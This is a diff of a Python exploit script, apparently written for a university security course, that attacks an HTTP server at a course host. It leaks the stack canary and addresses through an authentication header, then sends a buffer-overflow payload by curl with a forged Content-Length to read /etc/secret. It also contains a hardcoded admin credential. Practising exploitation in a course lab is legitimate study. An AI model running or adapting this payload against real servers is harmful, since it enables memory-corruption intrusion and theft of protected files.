@@ -1,9 +1,8 @@
 
+url =  "http://project-2.csec.chatzi.org:8000"
+auth = "admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
 
-url = "http://project-2.csec.chatzi.org:8000"
-pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
-
-
+import subprocess
 from requests import Request, Session
 import base64
 import time
@@ -24,6 +23,8 @@ def transform_address(address):
 	mybytes= address.to_bytes(4, byteorder='little')
 	mystring = ""
 	for b in mybytes:
+		# if int(b) == 26 or int(b) == 61:
+		# 	print("Probably error")
 		if int(b) != 0:
 			mystring += '%c' % int(b)
 		else:
@@ -43,14 +44,15 @@ def set_variables():
 	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
 	response = requests.get(url,headers = headers)
 
-	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')
+	tokenized_result = response.headers['WWW-Authenticate'][13:-1].split(' ')
 
 
+	addr_last = int(tokenized_result[-1],16)		#last
+	addr_semi_last = int(tokenized_result[-2],16)	#second last
+	canary = int(tokenized_result[-4],16)			#4th last
+	addr_3rd = int(tokenized_result[4],16)			#3rd address
 
-	addr_last = int(mystring[-1],16)		#last
-	addr_semi_last = int(mystring[-2],16)	#second last
-	canary = int(mystring[-4],16)			#4th last
-	addr_3rd = int(mystring[4],16)			#3rd address
+	time.sleep(0.5)
 
 set_variables()
 
@@ -76,7 +78,7 @@ data = filename
 data +=  80*"!" 
 data += transform_address(buffer_address + 140 + 4) #param_name: pointer to '\0' 
 data += 8*"!" + 4*"-" + 4*"-"+4*"!"					#name and c will be overwritten
-data += transform_address(buffer_address)		#p_post_data points to the first '&'
+data += transform_address(buffer_address)			#p_post_data points to the first '&'
 data += 4*"-" 										#value will be overwritten
 data += transform_address(canary)
 data += transform_address(old_ebx) 
@@ -88,26 +90,29 @@ data += transform_address(buffer_address)			#send_file argument: pointer to /etc
 data += '\0'
 
 
-s = Session()
 
-req = Request('POST', url, data=data)
-
-prepped = req.prepare()
-prepped.headers['Content-Length'] = 66    # set the payload in something smaller in order to perform buffer overflow
-prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
-response = s.send(prepped)
-
-content = str(response.content)[84:-1] #Content of /etc/secret
+#Store payload into a temporary binary file called mybin
+binary_data = bytes(data, 'latin-1')
+with open('mybin', 'wb') as file:
+    file.write(binary_data)
 
 
-hex_string = content
+curl_command =(
+	"curl -m 5 -u"
+	+ auth
+	+" --data-binary '@mybin' "
+	+ url
+	+" -H 'Content-Length: 66'"
+	)
 
-# Convert hex escape sequences to binary
-decoded_string = codecs.escape_decode(hex_string)[0].decode()
+try:
+	result = subprocess.run(curl_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,check=True)
+except subprocess.CalledProcessError:
+	exit()
 
-# Print the converted string to a file
-with open('puppies.txt', 'w') as file:
-    file.write(decoded_string)
-    print("String saved to puppies.txt")
+content = str(result.stdout)[84:-1] # Result of the instruction
 
+decoded_output = codecs.escape_decode(content)[0].decode() # Decode binary characters
+
+print(decoded_output)
 
